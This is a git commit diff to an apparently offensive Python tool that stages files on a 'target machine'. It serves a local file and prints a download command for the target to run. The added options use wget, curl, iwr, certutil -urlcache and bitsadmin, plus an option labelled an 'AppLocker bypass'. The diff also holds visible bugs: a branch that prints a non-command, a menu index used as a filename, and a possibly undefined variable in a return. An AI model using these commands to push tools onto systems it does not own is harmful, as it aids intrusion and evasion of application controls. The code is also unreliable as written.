666837ad73a89b0248d61fd37ea357f270f3a72d
Frozenk <newolf-hackworld@wanadoo.fr>
2024-05-28 17:26:39 +0200

    Update uploader.py

--- uploader.py
+++ uploader.py
@@ -32,13 +32,28 @@ def signal_handler(sig, frame):
 signal.signal(signal.SIGINT, signal_handler)
 
 # Géstion de la syntaxe
-def Syntaxe(OS, IPHOST, selected_file, selected_port):
+def Syntaxe(OS, IPHOST, selected_file, selected_port,Payload,Output):
     style = ("bg_black", "fg_yellow", "bold")
     while True:  # Boucle pour réessayer avec un nouveau port en cas d'échec
         if OS == "Linux" or OS == "linux": 
-            syntaxeFinal = f'wget http://{IPHOST}:{selected_port}/{os.path.basename(selected_file)}'
+            if Payload == "Wget":
+                syntaxeFinal = f'wget http://{IPHOST}:{selected_port}/{os.path.basename(selected_file)}'
+            elif Payload == "Curl":
+                syntaxeFinal = f'curl http://{IPHOST}:{selected_port}/{os.path.basename(selected_file)} -o {Output} '
+    
+
         elif OS == "Windows" or OS == "windows":
-            syntaxeFinal = f'iwr http://{IPHOST}:{selected_port}/{os.path.basename(selected_file)} -O {os.path.basename(selected_file)}'
+            if Payload == "Iwr":
+                syntaxeFinal = f'iwr http://{IPHOST}:{selected_port}/{os.path.basename(selected_file)} -O {Output} '
+            elif Payload == "Certutil":
+                syntaxeFinal = f'certutil.exe -urlcache -f http://{IPHOST}:{selected_port}/{os.path.basename(selected_file)}'
+            elif Payload == "Wget":
+                syntaxeFinal = f'wget http://{IPHOST}:{selected_port}/{os.path.basename(selected_file)} -OutFile {Output}'
+            elif Payload =="Bitsadmin":
+                syntaxeFinal = f'bitsadmin.exe /transfer 5720 /download /priority normal http://{IPHOST}:{selected_port}/{os.path.basename(selected_file)} {Output} '
+            elif Payload == "Regsvr32":
+                syntaxeFinal = f'AppLocker bypass http://{IPHOST}:{selected_port}/{os.path.basename(selected_file)}'
+            
         else:
             print("/!\  \033[91mERROR\033[0m  : unsupported operating system")
             return
@@ -102,7 +117,7 @@ def check_user_capabilities():
         print("You must run this script with root privileges or assign the necessary capabilities to the Python binary.")
         return False
     
-def OS_menu(os_arg=None):
+def OS_menu(os_arg=None, payload_arg=None,Output_arg=None):
     # Menu système d'exploitation de la cible :
     if os_arg is not None:
         return os_arg
@@ -113,7 +128,30 @@ def OS_menu(os_arg=None):
         terminal_menu = TerminalMenu(target_OS, menu_cursor="=>  ", menu_highlight_style=style, title="What is the target OS?")
         menu_entry_index = terminal_menu.show()
         selected_os = target_OS[menu_entry_index]
-    return selected_os
+
+    # Menu Payload
+    if selected_os.lower() == "linux":
+        payload_type = ["Wget", "Curl"]
+        if payload_arg is not None:
+            selected_payload = payload_arg
+        else:
+            payload_menu = TerminalMenu(payload_type, menu_cursor="=>  ", menu_highlight_style=style, title="What type of command do you want?")
+            payload_menu_entry_index = payload_menu.show()
+            selected_payload = payload_type[payload_menu_entry_index]
+
+    elif selected_os.lower() == "windows":
+        payload_type = ["Iwr", "Certutil", "Wget","Bitsadmin","Regsvr32"]
+        if payload_arg is not None:
+            selected_payload = payload_arg
+        else:
+            payload_menu = TerminalMenu(payload_type, menu_cursor="=>  ", menu_highlight_style=style, title="What type of command do you want?")
+            payload_menu_entry_index = payload_menu.show()
+            selected_payload = payload_type[payload_menu_entry_index]
+    else:
+        print("ERROR")
+
+    return target_OS[menu_entry_index],payload_type[payload_menu_entry_index]
+    
 
 def IP_menu(IPHOST, style, port=None):
     if port is not None:
@@ -139,9 +177,9 @@ def IP_menu(IPHOST, style, port=None):
                 selected_port = int(input("Please enter another port : "))
         return selected_port
 
-def MenuGeneral(os_arg=None, dir_arg=None, port=None):
+def MenuGeneral(os_arg=None, dir_arg=None, port=None,payload_arg=None,Output_arg=None):
     style = ("bg_black", "fg_yellow", "bold")
-    OS = OS_menu(os_arg)
+    OS, Payload = OS_menu(os_arg, payload_arg)
   
 
     # Menu choix de l'interface réseau
@@ -178,11 +216,22 @@ def MenuGeneral(os_arg=None, dir_arg=None, port=None):
         selected_directory = dir_arg
 
     # Menu choix du fichier à uploader
-    
     try:
         selected_file = subprocess.check_output(f"cd {selected_directory} && fzf", shell=True).decode().strip()
         selected_file = os.path.join(selected_directory, selected_file)
-        print(f"You have selected the file : {selected_file}!")
+
+        if Output_arg is None:
+
+            ChoixOutput = [os.path.basename(selected_file), "Change name"]
+            Output_menu = TerminalMenu(ChoixOutput, menu_cursor="=>  ", menu_highlight_style=style, title="Filename to write on the target machine? ")
+            Output_entry_index = Output_menu.show()
+            if ChoixOutput[Output_entry_index] == "Change name":
+                Output = input("Enter the new name : ")
+            else:
+                Output = Output_entry_index
+        else:
+            Output = Output_arg
+        
     except subprocess.CalledProcessError as e:
         print("/!\  Error: Unable to select a file. try again.")
         sys.exit(1)
@@ -190,7 +239,7 @@ def MenuGeneral(os_arg=None, dir_arg=None, port=None):
  
     selected_port = IP_menu(IPHOST, style, port)
 
-    return OS, IPHOST, selected_file, selected_port
+    return OS, IPHOST, selected_file, selected_port,Payload,Output
 
 def main():
     parser = argparse.ArgumentParser(description="Tool for quickly downloading files to a remote machine based on the target operating system. Launch the program and follow the prompts.",
@@ -198,11 +247,13 @@ def main():
     parser.add_argument("--port","-p", type=int, help="Specify the port to use.")
     parser.add_argument("--os","-os", type=str, help="Specify the target operating system. (Linux or Windows)")
     parser.add_argument("--dir","-d", type=str, help="Specify the directory of your file.")
+    parser.add_argument("--Output","-o",type=str,help="File to write on the target machine")
+    parser.add_argument("--payload",type=str,help="Type of Payload")
     args = parser.parse_args()
    
    
-    OS, IPHOST, selected_file, selected_port = MenuGeneral(args.os, args.dir, args.port)
-    Syntaxe(OS, IPHOST, selected_file, selected_port)
+    OS, IPHOST, selected_file, selected_port,Payload,Output = MenuGeneral(args.os, args.dir, args.port,args.payload,args.Output)
+    Syntaxe(OS, IPHOST, selected_file, selected_port,Payload,Output)
 
 if __name__ == "__main__":
     main()
